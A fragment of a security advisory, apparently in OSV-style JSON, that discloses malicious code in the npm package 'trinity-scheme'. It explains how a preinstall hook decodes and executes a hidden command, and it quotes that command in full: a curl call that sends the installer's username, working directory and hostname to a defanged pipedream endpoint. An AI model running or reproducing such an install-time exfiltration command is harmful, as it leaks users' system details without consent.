  "summary": "Malicious code in trinity-scheme (npm)",
  "details": "The preinstall hook (node preinstall.js) reads a hex-encoded command from preinstall.json, decodes it, and executes it via child_process.exec. The decoded command is: curl hxxps://eo7o7j442dx6yl6[.]m[.]pipedream[.]net/ -d \"whoami=`whoami`\u0026pwd=`pwd`\u0026hostname=`hostname`\" — exfiltrating the installer's username, current working directory, and hostname to a pipedream[.]net endpoint on every install.",
